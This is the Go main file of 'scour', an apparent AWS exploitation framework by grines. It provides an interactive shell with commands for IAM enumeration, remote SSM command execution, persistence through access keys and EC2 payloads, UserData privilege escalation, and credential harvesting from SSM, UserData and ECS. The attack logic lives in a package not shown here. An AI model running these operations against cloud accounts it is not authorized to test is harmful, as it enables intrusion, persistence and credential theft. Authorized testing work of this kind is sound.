package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/chzyer/readline"
	"github.com/gookit/color"
	"github.com/grines/scour/pkg/awsdata"
)

var sess *session.Session
var region string

func main() {
	start()
}

func start() {
	target := ""

	red := color.FgRed.Render
	blue := color.FgBlue.Render
	green := color.FgGreen.Render
	ascii := `AWS Exploitation Framework
 _____  _____ ____  _    _ _____  
/ ____|/ ____/ __ \| |  | |  __ \ 
| (___| |   | |  | | |  | | |__)|
\___ \| |   | |  | | |  | |  _  / 
____) | |___| |__| | |__| | | \ \ 
_____/ \_____\____/ \____/|_|  \_\ by grines
`
	print(ascii + "\n")

	for {
		var completer = readline.NewPrefixCompleter(
			readline.PcItem("whoami"),
			readline.PcItem("send-command"),
			readline.PcItem("list",
				readline.PcItem("users"),
				readline.PcItem("groups"),
				readline.PcItem("groupsForUser"),
				readline.PcItem("roles"),
				readline.PcItem("ec2"),
				readline.PcItem("ssm-parameters"),
			),
			readline.PcItem("get",
				readline.PcItem("user"),
				readline.PcItem("group"),
				readline.PcItem("role"),
			),
			readline.PcItem("profile"),
			readline.PcItem("enum",
				readline.PcItem("IAM"),
			),
			readline.PcItem("persist",
				readline.PcItem("AccessKey"),
				readline.PcItem("EC2"),
				readline.PcItem("SSM"),
			),
			readline.PcItem("privesc",
				readline.PcItem("UserData"),
				readline.PcItem("IAM"),
			),
			readline.PcItem("creds",
				readline.PcItem("UserData"),
				readline.PcItem("SSM"),
				readline.PcItem("Lambda"),
				readline.PcItem("ECS"),
			),
		)
		l, err := readline.NewEx(&readline.Config{
			Prompt:          "\033[31m»\033[0m ",
			HistoryFile:     "/tmp/readline.tmp",
			AutoComplete:    completer,
			InterruptPrompt: "^C",
			EOFPrompt:       "exit",

			HistorySearchFold:   true,
			FuncFilterInputRune: filterInput,
		})
		if err != nil {
			panic(err)
		}
		defer l.Close()

		log.SetOutput(l.Stderr())
		if target == "" {
			l.SetPrompt(red("Not Connected") + " <" + blue(target) + "> ")
		} else {
			l.SetPrompt(green("Connected") + " <" + blue(target) + "> ")
		}
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {

		//Load aws profile from .aws/credentials
		case strings.HasPrefix(line, "profile "):
			parts := strings.Split(line, " ")
			target = parts[1]
			region = parts[2]
			sess = getProfile(target, region)

		//The whoami/whoareyou
		case strings.HasPrefix(line, "whoami"):
			awsdata.Whoami(sess)
		case strings.HasPrefix(line, "get user "):
			parts := strings.Split(line, " ")
			username := parts[2]
			awsdata.GetUser(sess, username)

		case strings.HasPrefix(line, "send-command"):
			s := line
			r := regexp.MustCompile(`[^\s"']+|"([^"]*)"|'([^']*)`)
			parts := r.FindAllString(s, -1)
			fmt.Println(parts)
			instance := parts[1]
			cmd := parts[2]
			cmdid := awsdata.SendCommand(sess, instance, cmd)
			if cmdid != "" {
				time.Sleep(5 * time.Second)
				awsdata.GetCommandInvocation(sess, instance, cmdid)
			}

		//Persistence operations
		case strings.HasPrefix(line, "persist AccessKey"):
			parts := strings.Split(line, " ")
			username := parts[2]
			awsdata.PersistAccessKey(sess, username)
		case strings.HasPrefix(line, "persist EC2"):
			parts := strings.Split(line, " ")
			payloadurl := parts[2]
			ami := parts[3]
			awsdata.PersistEC2(sess, payloadurl, ami)
		case strings.HasPrefix(line, "persist SSM"):
			parts := strings.Split(line, " ")
			ami := parts[2]
			awsdata.PersistSSM(sess, ami)

		//Privesc Operations
		case strings.HasPrefix(line, "privesc UserData"):
			parts := strings.Split(line, " ")
			payload := parts[2]
			instance := parts[3]
			awsdata.PrivescUserdata(sess, payload, instance)

		//List operations
		case strings.HasPrefix(line, "list ssm-parameters"):
			awsdata.DescribeParameters(sess)
		case strings.HasPrefix(line, "list users"):
			awsdata.ListUsers(sess)
		case strings.HasPrefix(line, "list groups"):
			awsdata.ListGroups(sess)
		case strings.HasPrefix(line, "list ec2s"):
			awsdata.DescribeInstances(sess)
		case strings.HasPrefix(line, "list ecs-task-definitions"):
			awsdata.ListTaskDefinitions(sess)
		case strings.HasPrefix(line, "list groupsForUser "):
			parts := strings.Split(line, " ")
			username := parts[2]
			awsdata.ListGroupsForUser(sess, username)
		case strings.HasPrefix(line, "list roles"):
			awsdata.ListRoles(sess)

		//Enumeration
		case strings.HasPrefix(line, "enum IAM"):
			awsdata.IamEnumerate(sess)

		//Credential Discovery
		case strings.HasPrefix(line, "creds UserData"):
			awsdata.CredentialDiscoveryUserData(sess)
		case strings.HasPrefix(line, "creds SSM"):
			awsdata.CredentialDiscoverySSMParams(sess)
		case strings.HasPrefix(line, "creds ECS"):
			awsdata.CredentialDiscoveryECSEnv(sess)

		//Show command history
		case line == "history":
			dat, err := ioutil.ReadFile("/tmp/readline.tmp")
			if err != nil {
				break
			}
			fmt.Print(string(dat))

		//exit
		case line == "bye":
			goto exit

		//Default if no case
		default:
			cmdString := line
			if cmdString == "exit" {
				os.Exit(1)
			}
		}
	}
exit:
}

//Filter input from readline CtrlZ
func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

//Load profile from .aws/credentials by name
func getProfile(pname string, region string) *session.Session {
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewSharedCredentials("", pname),
	})
	if err != nil {
		fmt.Println("Invalid Credentials")
	}
	_, err = sess.Config.Credentials.Get()
	if err != nil {
		fmt.Println("Invalid Credentials")
	}
	return sess
}
